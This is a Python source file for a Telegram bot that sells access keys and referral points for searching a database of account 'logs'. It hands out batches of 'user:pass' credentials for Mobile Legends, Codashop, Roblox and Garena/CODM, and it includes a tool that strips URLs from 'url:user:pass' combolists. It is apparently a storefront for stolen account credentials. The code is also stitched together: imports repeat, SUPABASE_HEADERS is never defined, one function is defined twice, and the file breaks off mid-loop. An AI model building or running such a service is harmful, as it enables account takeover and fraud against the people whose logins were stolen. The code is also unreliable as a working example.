# === Standard Library Imports ===
import os
import sys
import io
import re
import json
import time
import glob
import base64
import asyncio
import random
import string
import requests
from collections import defaultdict, Counter
from datetime import datetime, timedelta, timezone
from functools import wraps

# === Third-party Libraries ===
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove
)
from supabase import create_client

# === Project Imports ===
import main

# === Patch generate_dynamic_cookies if not defined ===
if not hasattr(main, 'generate_dynamic_cookies'):
    def generate_dynamic_cookies(*args, **kwargs):
        return {
            "sessionid": "fake_session_123",
            "token": "dummy_token"
        }
    main.generate_dynamic_cookies = generate_dynamic_cookies

import os
from dotenv import load_dotenv
from pyrogram import Client
from supabase import create_client

# Load .env locally only
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_SERVICE_ROLE = os.getenv("SUPABASE_SERVICE_ROLE")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

# Initialize Supabase
supabase = create_client(SUPABASE_URL, SUPABASE_SERVICE_ROLE)

# Initialize Pyrogram Client
app = Client("log_search_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Utility to generate a unique referral code
# === Imports ===
from pyrogram import filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, ForceReply, InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timezone
from functools import wraps
import random, string

# === Utility Functions ===

def generate_referral_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def get_user_from_database(user_id):
    res = supabase.table("referral_users").select("*").eq("user_id", user_id).execute()
    return res.data[0] if res.data else None

def get_user_by_referral_code(code):
    res = supabase.table("referral_users").select("*").eq("referral_code", code).execute()
    return res.data[0] if res.data else None

def update_user_points_and_uses(user_id, points, search_uses_left):
    supabase.table("referral_users").update({
        "points": int(points),
        "search_uses_left": int(search_uses_left)
    }).eq("user_id", user_id).execute()

def create_user_in_database(user_id, referral_code):
    supabase.table("referral_users").insert({
        "user_id": user_id,
        "points": 0,
        "search_uses_left": 0,
        "referral_code": referral_code,
        "referrer_id": None
    }).execute()

def get_or_create_user(user_id):
    user = get_user_from_database(user_id)
    if not user:
        create_user_in_database(user_id, generate_referral_code())
        user = get_user_from_database(user_id)
    return user

# === Decorators ===

def require_valid_key(func):
    @wraps(func)
    async def wrapper(client, message):
        user_id = message.from_user.id
        res = supabase.table("keys").select("*").eq("user_id", user_id).execute()
        if not res.data:
            return await message.reply("❌ You don't have an active key.")
        key = res.data[0]
        if not key.get("expires_at"):
            return await message.reply("❌ Key has no expiration.")
        remaining = (datetime.fromisoformat(key["expires_at"].replace("Z", "+00:00")) - datetime.now(timezone.utc)).days
        if remaining < 7:
            return await message.reply("❌ Your key must have more than 7 days left.")
        return await func(client, message)
    return wrapper

# === Referral Code Redemption ===

def redeem_referral_code(user_id, referral_code):
    user = get_user_from_database(user_id)
    if not user:
        return "❌ User not found."
    if user.get("referrer_id"):
        return "❌ You already redeemed a referral code."
    referrer = get_user_by_referral_code(referral_code)
    if not referrer:
        return "❌ Invalid referral code."
    if referrer["user_id"] == user_id:
        return "❌ Cannot redeem your own code."

    # Update referrer (gain 1 point, search uses same)
    update_user_points_and_uses(
        referrer["user_id"],
        referrer.get("points", 0) + 1,
        referrer.get("search_uses_left", 0)
    )
    
    # Update redeemer (gain 1 point, get 3 search uses for example)
    update_user_points_and_uses(
        user_id,
        user.get("points", 0) + 1,
        user.get("search_uses_left", 0) + 3  # <<< here add uses
    )

    # Mark referrer_id
    supabase.table("referral_users").update({"referrer_id": referrer["user_id"]}).eq("user_id", user_id).execute()

    return "✅ Successfully redeemed! You and your friend earned +1 point!"

# === Start & Referral Commands ===

@app.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    user = get_user_from_database(user_id)
    if user and user.get("points", 0) >= 20:
        return await message.reply("🚀 You have access! Use /list to see commands.")
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔑 Buy Access Key", url="https://t.me/azymrk")]])
    await message.reply(
        "👋 Welcome! You need to redeem a key.\n"
        "Use `/redeem <key>` to activate.\n\n"
        "❓ No money? Use `/me` to earn points with referrals!",
        reply_markup=keyboard
    )

from telegram import ReplyKeyboardRemove

@app.on_message(filters.command("me"))
async def me(client, message):
    user = get_or_create_user(message.from_user.id)
    points, uses = user.get("points", 0), user.get("search_uses_left", 0)
    
    keyboard = (
        ReplyKeyboardMarkup([[KeyboardButton("🔗 My Referral"), KeyboardButton("🎟️ Redeem Referral"), KeyboardButton("💎 Redeem Points")]], resize_keyboard=True)
    )
    
    msg = (
        f"👤 **Account Info**\n\n✨ **Points**: `{points}` pts\n🔎 **Search Uses Left**: `{uses}`"
        if points >= 20 else
        f"👤 **Referral Panel**\n\n✨ **Points**: `{points}` pts\n"
        "📢 Share your code to earn **+1 point**!\nYou need `20 pts` to unlock full access."
    )
    
    await message.reply(msg, reply_markup=keyboard)

@app.on_message(filters.text & filters.regex("^(🔗 My Referral|/myreferral)$"))
async def show_referral_code_command(client, message):
    user = get_user_from_database(message.from_user.id)
    if not user:
        return await message.reply("❌ No data found.")
    
    code = user.get("referral_code")
    points = user.get("points", 0)
    
    share_text = (
        "@AkiReynBot 🚀 Get Free Access!\n\n"
        "To Share Your Referral Code:\n"
        "1. Use /me\n"
        "2. Press 'My Referral Code'\n"
        "3. Press 'Share'\n\n"
        "To Redeem a Referral Code:\n"
        "1. Use /me\n"
        "2. Press 'Redeem Referral'\n"
        "3. Send the referral code\n\n"
        f"🔗 My Referral Code: {code}\n"
        "Each successful referral gives +1 point!"
    )

    keyboard = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📢 Share", switch_inline_query=share_text)]]
    )
    
    await message.reply(
        f"💳 **Your Code**: `{code}`\n✨ **Points**: `{points}` pts",
        reply_markup=keyboard
    )

user_redeeming_referral = {}

@app.on_message(filters.text & filters.regex("^🎟️ Redeem Referral$"))
async def prompt_referral_code(client, message):
    user_redeeming_referral[message.from_user.id] = True
    await message.reply("🎟️ Send your referral code now:", reply_markup=ForceReply(selective=True))

@app.on_message(filters.reply)
async def handle_redeem_reply(client, message):
    user_id = message.from_user.id
    if user_redeeming_referral.pop(user_id, None):
        result = redeem_referral_code(user_id, message.text.strip())
        await message.reply(result)
        user = get_user_from_database(user_id)
        
        # Reset keyboard after handling the referral
        keyboard = (
            ReplyKeyboardMarkup([[KeyboardButton("🔗 My Referral"), KeyboardButton("🎟️ Redeem Referral"), KeyboardButton("💎 Redeem Points")]], resize_keyboard=True)
            if user.get("points", 0) >= 20 else
            ReplyKeyboardMarkup([[KeyboardButton("🔗 My Referral"), KeyboardButton("🎟️ Redeem Referral")]], resize_keyboard=True)
        )
        
        await message.reply("✅ Process complete!" if user.get("points", 0) >= 20 else "✅ Keep sharing for more points!", reply_markup=keyboard)

@app.on_message(filters.command("redeemreferral"))
async def redeem_referral_manual(client, message):
    try:
        code = message.text.split()[1]
    except IndexError:
        return await message.reply("❌ Use: /redeemreferral <code>")
    result = redeem_referral_code(message.from_user.id, code)
    await message.reply(result)
    user = get_user_from_database(message.from_user.id)
    
    # Reset keyboard after processing referral
    keyboard = (
        ReplyKeyboardMarkup([[KeyboardButton("🔗 My Referral"), KeyboardButton("🎟️ Redeem Referral"), KeyboardButton("💎 Redeem Points")]], resize_keyboard=True)
        if user.get("points", 0) >= 20 else
        ReplyKeyboardMarkup([[KeyboardButton("🔗 My Referral"), KeyboardButton("🎟️ Redeem Referral")]], resize_keyboard=True)
    )
    await message.reply("✅ Referral processed!" if user.get("points", 0) >= 20 else "✅ Keep inviting friends!", reply_markup=keyboard)

from pyrogram.types import ReplyKeyboardRemove

@app.on_message(filters.text & filters.regex("^💎 Redeem Points$"))
async def redeem_points(client, message):
    user_id = message.from_user.id
    user = get_user_from_database(user_id)

    # Ensure the user exists
    if not user:
        return await message.reply("❌ No user data found.")
    
    # Check if the user has enough points
    if user.get("points", 0) < 20:
        return await message.reply("❌ You need at least 20 points to redeem points.\nShare your referrals or buy keys from @thatkidAki!")

    # Redeem points for 3 search uses
    update_user_points_and_uses(user_id, user["points"] - 20, user.get("search_uses_left", 0) + 3)

    # Send confirmation
    await message.reply("✅ You've redeemed 3 search uses for 20 points!")

    # Remove keyboard after redeeming
    keyboard = ReplyKeyboardRemove()  # Corrected usage
    await message.reply("✅ You've successfully redeemed points!", reply_markup=keyboard)

@app.on_message(filters.command("list"))
async def list_commands(client, message):
    user_id = message.from_user.id

    if not check_user_access(user_id):
        await message.reply("🚫 You must redeem a key first! Use `/redeem <key>`.")
        return

    await message.reply(
        "📌 **Available Commands:**\n"
        "🔹 `/generate <duration>` - Generate a key (Admin only)\n"
        "🔹 `/checkfile` - Not yet available\n"
        "🔹 `/status` - Check your subscription status\n"
        "🔹 `/remove <key>` - Remove a key (Admin only)\n"
        "🔹 `/removeurl` - Removes urls from your txt\n"
        "🔹 `/searchvip1` - Searches vip results(once a day)\n"
        "🔹 `/searchvip2` - Searches vip results(once a day)\n"
        "🔹 `/search` - Search in the database\n\n"
        "🚀 Enjoy your access!"
    )

def load_redeemed_user_ids():
    try:
        response = supabase.table("keys").select("redeemed_by").not_.is_("redeemed_by", None).execute()
        user_ids = set()
        for row in response.data:
            user_id = row.get("redeemed_by")
            if user_id:
                user_ids.add(int(user_id))  # ensure it's an integer
        return list(user_ids)
    except Exception as e:
        print(f"[Supabase] Error loading redeemed users: {e}")
        return []

@app.on_message(filters.command("announcement") & filters.user(ADMIN_ID))
async def announcement(client, message):
    try:
        if len(message.command) < 2:
            return await message.reply("❌ Usage: `/announcement <message>`", quote=True)

        announcement_text = message.text.split(" ", 1)[1]
        user_ids = load_redeemed_user_ids()

        if not user_ids:
            return await message.reply("⚠️ No users found who redeemed a key.")

        sent, failed = 0, 0
        for user_id in user_ids:
            try:
                await client.send_message(user_id, f"📢 **Announcement**:\n\n{announcement_text}")
                sent += 1
                await asyncio.sleep(0.1)  # slow down to avoid flood
            except Exception as e:
                print(f"❌ Failed to send to {user_id}: {e}")
                failed += 1

        await message.reply(f"✅ Announcement sent to {sent} users.\n❌ Failed to send to {failed}.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

# -------------------------
# KEY MANAGEMENT FUNCTIONS
# -------------------------

# 📌 Function to store key in Supabase
def store_key(key, duration, owner_id):
    # Calculate expiry time based on the given duration
    expiry_time = (datetime.now(timezone.utc) + duration).isoformat()
    
    # Prepare data to insert into the 'keys' table
    data = {
        "key": key,
        "expiry": expiry_time,
        "owner_id": owner_id
    }

    # Make the API request to insert the key data into the 'keys' table
    response = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS, json=data)
    
    # Debugging: Print the response details
    print("🔍 Supabase Response:", response.status_code, response.text)

    # Return True if the key was successfully inserted
    return response.status_code == 201


# 🔄 Function to check if a user has redeemed a key (i.e., has active access)
def check_user_access(user_id):
    # Get the key associated with the user by checking redeemed_by
    response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
    keys = response.json()
    
    if keys:
        # Get the expiry time from the returned keys
        expiry_time = datetime.fromisoformat(keys[0]["expiry"]).replace(tzinfo=timezone.utc)
        # Check if the key is still valid (not expired)
        return expiry_time > datetime.now(timezone.utc)
    
    return False

# -------------------------
# BOT COMMANDS
# -------------------------
from pyrogram import filters

from pyrogram import filters

@app.on_message(filters.command("addpts") & filters.user(5110224851))  # Only admin
async def add_points_command(client, message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            await message.reply("❌ Usage: /addpts <user_id> <how_many_points>")
            return

        user_id = int(parts[1])
        points_to_add = int(parts[2])

        # Fetch user
        user = supabase.table('referral_users').select("points").eq("user_id", user_id).single().execute()

        if user.data:
            current_points = user.data.get("points", 0) or 0
            new_points = current_points + points_to_add

            # Update points
            supabase.table('referral_users').update({"points": new_points}).eq("user_id", user_id).execute()
            await message.reply(f"✅ Successfully added `{points_to_add}` points to user `{user_id}`.\n\nTotal points now: `{new_points}`")
        else:
            await message.reply(f"❌ User `{user_id}` not found in referral_users table.")

    except Exception as e:
        await message.reply(f"⚠️ Error: {e}")

# 🎟 `/generate` command (Admin Only)
@app.on_message(filters.command("generate") & filters.user(ADMIN_ID))
async def generate_key(client, message):
    try:
        args = message.text.split()
        if len(args) != 2:
            await message.reply("❌ Usage: `/generate <duration>` (e.g., `/generate 1d`)")
            return

        duration_str = args[1]
        unit = duration_str[-1]
        amount = int(duration_str[:-1])

        duration = {
            "m": timedelta(minutes=amount),
            "h": timedelta(hours=amount),
            "d": timedelta(days=amount)
        }.get(unit)

        if not duration:
            await message.reply("❌ Invalid format! Use `m` for minutes, `h` for hours, `d` for days.")
            return

        # Generate a random 15-character key (alphanumeric)
        key = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=15))
        
        success = store_key(key, duration, message.from_user.id)
        if success:
            expiry_time = (datetime.now(timezone.utc) + duration).strftime('%Y-%m-%d %H:%M:%S')
            await message.reply(f"✅ **Generated Key:** `{key}`\n⏳ **Expires at:** {expiry_time}")
        else:
            await message.reply("❌ Failed to generate key. Try again later.")

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

# 🎟 `/redeem` command (One-Time Use Per Key)
@app.on_message(filters.command("redeem"))
async def redeem_key(client, message):
    try:
        args = message.text.split()
        if len(args) != 2:
            await message.reply("❌ Usage: `/redeem <key>`")
            return

        key = args[1]
        user_id = message.from_user.id

        # Check if the user is already in the 'users' table
        response = requests.get(f"{SUPABASE_URL}/rest/v1/users?id=eq.{user_id}", headers=SUPABASE_HEADERS)
        if response.status_code != 200:
            await message.reply(f"❌ Error checking user existence: {response.status_code} - {response.text}")
            return

        if not response.json():
            # If the user does not exist, insert them into the 'users' table
            user_data = {
                "id": user_id,
                "username": message.from_user.username or ""  # Optional: Store username if needed
            }
            insert_response = requests.post(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS, json=user_data)
            if insert_response.status_code != 201:
                await message.reply(f"❌ Error adding user: {insert_response.status_code} - {insert_response.text}")
                return

        # Check if the user has already redeemed a key
        response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
        if response.status_code != 200:
            await message.reply(f"❌ Error checking redemption: {response.status_code} - {response.text}")
            return
        if response.json():
            await message.reply("❌ You have already redeemed a key.")
            return

        # Check if key exists and is not redeemed
        response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
        if response.status_code != 200:
            await message.reply(f"❌ Error fetching key: {response.status_code} - {response.text}")
            return

        keys = response.json()
        if not keys:
            await message.reply("❌ Invalid or expired key!")
            return

        key_data = keys[0]
        if key_data["redeemed_by"]:
            await message.reply("❌ This key has already been redeemed!")
            return

        expiry_time_utc = datetime.fromisoformat(key_data["expiry"]).replace(tzinfo=timezone.utc)
        expiry_time_pht = expiry_time_utc.astimezone(pytz.timezone("Asia/Manila"))

        if expiry_time_utc < datetime.now(timezone.utc):
            await message.reply("❌ This key has expired!")
            return

        # Redeem key by updating "redeemed_by"
        update_data = {"redeemed_by": user_id}
        response = requests.patch(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS, json=update_data)

        if response.status_code in [200, 204]:
            expiry_str = expiry_time_pht.strftime('%Y-%m-%d %H:%M:%S')
            await message.reply(f"✅ Key successfully redeemed! Kindly use /list to see all the available commands.\n⏳ **Expires at (PHT):** `{expiry_str}`")
        else:
            # Log the error message from Supabase response for debugging
            await message.reply(f"❌ Error redeeming key. Status code: {response.status_code} - {response.text}")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")


@app.on_message(filters.command("status"))
async def check_status(client, message):
    try:
        user_id = message.from_user.id

        # Fetch the key details for the user
        response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
        keys = response.json()
        
        if not keys:
            await message.reply("🚫 You haven't redeemed a key yet!")
            return

        key_data = keys[0]
        expiry_time_utc = datetime.fromisoformat(key_data["expiry"]).replace(tzinfo=timezone.utc)
        expiry_time_pht = expiry_time_utc.astimezone(pytz.timezone("Asia/Manila"))

        # Calculate remaining time
        now_pht = datetime.now(pytz.timezone("Asia/Manila"))
        time_left = expiry_time_pht - now_pht

        if time_left.total_seconds() <= 0:
            await message.reply("❌ Your key has expired!")
        else:
            days, seconds = divmod(time_left.total_seconds(), 86400)
            hours, seconds = divmod(seconds, 3600)
            minutes, _ = divmod(seconds, 60)

            expiry_str = expiry_time_pht.strftime('%Y-%m-%d %H:%M:%S')
            time_left_str = f"{int(days)}d {int(hours)}h {int(minutes)}m"
            
            await message.reply(f"⏳ **Your key expires on:** `{expiry_str} PHT`\n🕒 **Time left:** `{time_left_str}`")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")


# 🗑 `/remove <key>` - Admin Only: Deletes a license key and revokes access
@app.on_message(filters.command("remove") & filters.user(ADMIN_ID))
async def remove_license(client, message):
    try:
        args = message.text.split()
        if len(args) != 2:
            await message.reply("❌ Usage: `/remove <key>`")
            return

        key = args[1]
        # Check if the key exists
        response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
        keys = response.json()
        if not keys:
            await message.reply(f"🚫 License key `{key}` not found.")
            return

        # Delete the key (this revokes access)
        response = requests.delete(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
        if response.status_code in [200, 204]:
            await message.reply(f"✅ License key `{key}` has been removed successfully.")
        else:
            await message.reply(f"❌ Error deleting key: {response.text}")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

from pyrogram.types import Message, InputMediaDocument

# Dictionary to track user states
user_state = {}

@app.on_message(filters.command("removeurl"))
async def remove_url_request(client, message: Message):
    """ Ask user to upload a file for URL removal """
    user_state[message.from_user.id] = "awaiting_file"
    await message.reply("📂 Please upload the file containing URLs, and I'll remove them!")

@app.on_message(filters.document)
async def process_file(client, message: Message):
    """ Process uploaded file and remove URLs """
    user_id = message.from_user.id
    
    # Check if user is in the correct state
    if user_state.get(user_id) != "awaiting_file":
        return

    # Reset state after receiving the file
    user_state.pop(user_id, None)

    # Download the file
    file_path = await message.download()
    
    # Read file content
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()

    # Process lines to remove URLs
    cleaned_lines = []
    for line in lines:
        parts = line.strip().split(":")
        if len(parts) >= 3:
            cleaned_lines.append(f"{parts[-2]}:{parts[-1]}")
        else:
            cleaned_lines.append(line.strip())

    # Check if file already had no URLs
    if cleaned_lines == lines:
        await message.reply("🤔 There's already no URL in there, dummy!")
        return

    # Save the cleaned file
    cleaned_file_path = "results_removedurl.txt"
    with open(cleaned_file_path, "w", encoding="utf-8") as file:
        file.write("\n".join(cleaned_lines))

    # Send the cleaned file back
    await client.send_document(
        chat_id=message.chat.id,
        document=cleaned_file_path,
        caption="✅ Here is your cleaned file without URLs!"
    )

    # Delete the temporary file
    os.remove(file_path)
    os.remove(cleaned_file_path)

# -------------------------
# LOG SEARCH FUNCTIONS (WITH UI)
# -------------------------

# 🔍 Function to get log files (files starting with "logs" and ending with ".txt")

from datetime import datetime, timezone
from functools import wraps
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import errors
from collections import Counter
import os, random
from supabase import create_client

# --- Supabase helpers ---

def get_key_data(user_id):
    res = supabase.table('keys').select('*').eq('redeemed_by', user_id).execute()
    return res.data[0] if res.data else None

def get_referral_data(user_id):
    res = supabase.table('referral_users').select('*').eq('user_id', user_id).execute()
    return res.data[0] if res.data else None

def check_user_access(user_id):
    now = datetime.now(timezone.utc)
    key_res = supabase.table('keys').select('expiry').eq('redeemed_by', user_id).execute()
    if key_res.data:
        expiry_str = key_res.data[0].get('expiry')
        if expiry_str:
            expiry = datetime.fromisoformat(expiry_str.replace("Z", "+00:00"))
            if expiry > now:
                return "key"
    ref_res = supabase.table('referral_users').select('search_uses_left').eq('user_id', user_id).execute()
    if ref_res.data and ref_res.data[0].get('search_uses_left', 0) > 0:
        return "referral"
    return None

# --- Access decorator ---

def restricted(func):
    @wraps(func)
    async def wrapper(client, message, *args, **kwargs):
        if not check_user_access(message.from_user.id):
            await message.reply("🚫 You must redeem a key first! Use `/redeem <key>`.")
            return
        return await func(client, message, *args, **kwargs)
    return wrapper

# --- UI: Search entry point ---

@app.on_message(filters.command("search"))
@restricted
async def ask_keyword(client, message):
    user_id = message.from_user.id
    access_type = check_user_access(user_id)
    if not access_type:
        await message.reply("❌ You don't have enough search uses left or a valid key.")
        return
    if access_type == "referral":
        ref = get_referral_data(user_id)
        if ref and ref.get('search_uses_left', 0) > 0:
            update_user_points_and_uses(user_id, ref.get('points', 0), ref['search_uses_left'] - 1)
        else:
            await message.reply("❌ You have no remaining search uses.")
            return
    keyboard = ReplyKeyboardMarkup([
        [KeyboardButton("⚔️ Mobile Legends")],
        [KeyboardButton("💰 Codashop")],
        [KeyboardButton("🧱 Roblox")],
        [KeyboardButton("🎯 CODM ▸")]
    ], resize_keyboard=True)
    await message.reply("🔎 **Database Search**\n\n📌 Choose a keyword to search:", reply_markup=keyboard)

# --- UI: Main keywords ---

@app.on_message(filters.regex("^(⚔️ Mobile Legends|💰 Codashop|🧱 Roblox|🎯 CODM ▸)$"))
async def handle_keyword_selection(client, message):
    keyword_map = {
        "⚔️ Mobile Legends": "mtacc",
        "💰 Codashop": "codashop",
        "🧱 Roblox": "roblox"
    }
    text = message.text
    if text in keyword_map:
        await message.reply(f"🔎 **Keyword Selected:** `{text[2:]}`", reply_markup=ReplyKeyboardRemove())
        await ask_format(client, message, keyword_map[text])
    elif text == "🎯 CODM ▸":
        keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("🔐 100082")],
            [KeyboardButton("🧩 100055")],
            [KeyboardButton("🛡️ Auth Garena")],
            [KeyboardButton("🕹️ Garena")],
            [KeyboardButton("⚙️ Gaslite")],
            [KeyboardButton("⬅️ Back")]
        ], resize_keyboard=True)
        await message.reply("🎯 **CODM Keywords:**\nChoose one to continue:", reply_markup=keyboard)

@app.on_message(filters.regex("^(🔐 100082|🧩 100055|🛡️ Auth Garena|🕹️ Garena|⚙️ Gaslite)$"))
async def handle_codm_sub_option(client, message):
    keyword_map = {
        "🔐 100082": "100082",
        "🧩 100055": "100055",
        "🛡️ Auth Garena": "authgop.garena.com",
        "🕹️ Garena": "garena.com",
        "⚙️ Gaslite": "gaslite"
    }
    keyword = keyword_map[message.text]
    await message.reply(f"🔎 **Keyword Selected:** `{keyword}`", reply_markup=ReplyKeyboardRemove())
    await ask_format(client, message, keyword)

@app.on_message(filters.regex("⬅️ Back"))
async def back_to_main_menu(client, message):
    keyboard = ReplyKeyboardMarkup([
        [KeyboardButton("⚔️ Mobile Legends")],
        [KeyboardButton("💰 Codashop")],
        [KeyboardButton("🧱 Roblox")],
        [KeyboardButton("🎯 CODM ▸")]
    ], resize_keyboard=True)
    await message.reply("🔎 **Database Search**\n\n📌 Choose a keyword to search:", reply_markup=keyboard)

# --- UI: Format selection ---

async def ask_format(client, message, keyword):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ User:Pass Only", callback_data=f"format_{keyword}_userpass")],
        [InlineKeyboardButton("🌍 Include URLs", callback_data=f"format_{keyword}_full")]
    ])
    await message.reply(f"🔎 **Keyword Selected:** `{keyword}`\n\n📌 **Choose Output Format:**", reply_markup=keyboard)

# --- Search execution ---

def get_log_files():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    return [os.path.join(current_dir, f) for f in os.listdir(current_dir) if f.endswith(".txt")]

@app.on_callback_query(filters.regex("^format_"))
async def perform_search(client, callback_query):
    await callback_query.message.delete()  # Delete the format selection message

    _, keyword, fmt = callback_query.data.split("_", 2)
    include_urls = fmt == "full"
    await callback_query.answer("✅ Searching the database...", show_alert=False)
    msg = await callback_query.message.reply_text(f"🔍 Searching `{keyword}`...\n[░░░░░░░░░░] 0%")

    try:
        # Fetch entries from Supabase
        query = supabase.table('entries').select('line').ilike('line', f'%{keyword}%')
        res = query.execute()
        entries = [row['line'] for row in res.data] if res.data else []
    except Exception as e:
        await msg.edit_text(f"❌ Supabase error: {str(e)}")
        return

    if not entries:
        await msg.edit_text("❌ No matches found.")
        return

    # Format entries
    results = set()
    for line in entries:
        if not include_urls:
            parts = line.split(":")
            if len(parts) >= 2:
                line = ":".join(parts[-2:])
        results.add(line.strip())

    if not results:
        await msg.edit_text("❌ No valid formatted results.")
        return

    # Filtering by result.txt (avoid overuse of same lines)
    result_file = "result.txt"
    existing_lines = []
    if os.path.exists(result_file):
        with open(result_file, "r", encoding="utf-8") as f:
            existing_lines = [line.strip() for line in f]
    line_counts = Counter(existing_lines)

    filtered = [r for r in results if line_counts[r] < 2]
    for r in filtered:
        line_counts[r] += 1

    if not filtered:
        await msg.edit_text("❌ No new valid results (limit reached per line).")
        return

    selected = random.sample(filtered, min(len(filtered), random.randint(100, 120)))
    with open(result_file, "w", encoding="utf-8") as f:
        for line in selected:
            f.write(f"{line}\n")

    preview = "\n".join(selected[:5]) + ("\n..." if len(selected) > 5 else "")
    label = "🌍 Full (with URLs)" if include_urls else "✅ User:Pass only"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Download Results", callback_data=f"download_results_{keyword}")],
        [InlineKeyboardButton("📋 Copy Code", callback_data=f"copy_code_{keyword}")]
    ])
    await msg.edit_text(
        f"🔎 **Results for:** `{keyword}`\n"
        f"📄 **Format:** {label}\n"
        f"📌 **Results Generated:** `{len(selected)}`\n\n"
        f"🔹 **Preview:**\n```\n{preview}\n```",
        reply_markup=keyboard
    )

# --- Result actions ---

@app.on_callback_query(filters.regex("^download_results_"))
async def send_results_file(client, callback_query):
    if os.path.exists("result.txt"):
        await callback_query.message.reply_document("result.txt", caption=f"📄 Results for `{callback_query.data.split('_', 2)[2]}`")
    else:
        await callback_query.answer("❌ Results file not found!", show_alert=True)

@app.on_callback_query(filters.regex("^copy_code_"))
async def copy_results_text(client, callback_query):
    if not os.path.exists("result.txt"):
        await callback_query.answer("❌ Results file not found!", show_alert=True)
        return
    with open("result.txt", "r", encoding="utf-8") as f:
        text = f.read()
    if len(text) > 4096:
        text = text[:4090] + "...\n[Truncated]"
    await callback_query.message.reply(
        f"🔎 <b>Results for:</b> <code>{callback_query.data.split('_', 2)[2]}</code>\n\n<pre>{text}</pre>",
        parse_mode="HTML"
    )

import requests
import random
import os
from datetime import datetime, timezone
from pyrogram import filters

def has_vip_access(user_id):
    response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
    data = response.json()

    if not data or not isinstance(data, list) or len(data) == 0:
        print(f"No data found for user {user_id}")
        return False

    expiry_str = data[0].get("expiry")
    if not expiry_str:
        print(f"Expiry field missing for user {user_id}")
        return False

    try:
        expiry_date = datetime.fromisoformat(expiry_str)
    except ValueError:
        print(f"Invalid date format for user {user_id}: {expiry_str}")
        return False

    now = datetime.now(timezone.utc)
    return (expiry_date - now).days >= 7

def can_use_vip_v2(user_id, column):
    if user_id == ADMIN_ID:
        return True, None

    if not has_vip_access(user_id):
        return False, "🚫 You need a VIP key with **at least 7 days** duration to use this command!"

    response = requests.get(f"{SUPABASE_URL}/rest/v1/vip_usage?user_id=eq.{user_id}", headers=SUPABASE_HEADERS)
    data = response.json()

    if data and data[0].get(column):
        try:
            last_used = datetime.fromisoformat(data[0][column])
            now = datetime.now(timezone.utc)

            if (now - last_used).total_seconds() < 86400:
                return False, "🚫 You can only use this command **once per day**. Try again tomorrow!"
        except ValueError:
            print(f"Invalid timestamp format: {data[0][column]}")

    return True, None

def update_vip_usage_v2(user_id, column):
    if user_id == ADMIN_ID:
        return

    now = datetime.now(timezone.utc).isoformat()
    data = {
        "user_id": user_id,
        column: now
    }

    response = requests.post(
        f"{SUPABASE_URL}/rest/v1/vip_usage",
        headers={**SUPABASE_HEADERS, "Prefer": "resolution=merge-duplicates"},
        json=data
    )

    if response.status_code not in [200, 201]:
        print(f"Error updating VIP usage for {user_id}: {response.status_code} - {response.text}")

@app.on_message(filters.command("searchvip1"))
async def search_vip1(client, message):
    user_id = message.from_user.id
    can_use, error_message = can_use_vip_v2(user_id, "last_used_vip1")
    if not can_use:
        await message.reply(error_message)
        return

    searching_msg = await message.reply("🔍 Searching Supabase for VIP1 results...")

    response = requests.get(
        f"{SUPABASE_URL}/rest/v1/entries?category=eq.vip1&select=username,pass",
        headers=SUPABASE_HEADERS
    )

    if response.status_code != 200:
        await searching_msg.edit_text("❌ Error fetching from Supabase.")
        return

    data = response.json()
    # Filter valid rows
    valid_rows = [row for row in data if row["username"] and row["pass"]]

    # Check if at least 80 rows available
    if len(valid_rows) < 80:
        await searching_msg.edit_text("❌ Not enough accounts found (less than 80). Please try again later.")
        return

    results = [f"{row['username']}:{row['pass']}" for row in valid_rows]

    sampled_results = random.sample(results, random.randint(80, 100))

    result_file = "vip1_results.txt"
    with open(result_file, "w", encoding="utf-8") as file:
        file.write("\n".join(sampled_results))

    await message.reply_document(result_file, caption="📄 **VIP1 Results**")

    # Delete sent rows from Supabase
    for entry in sampled_results:
        username, password = entry.split(":", 1)
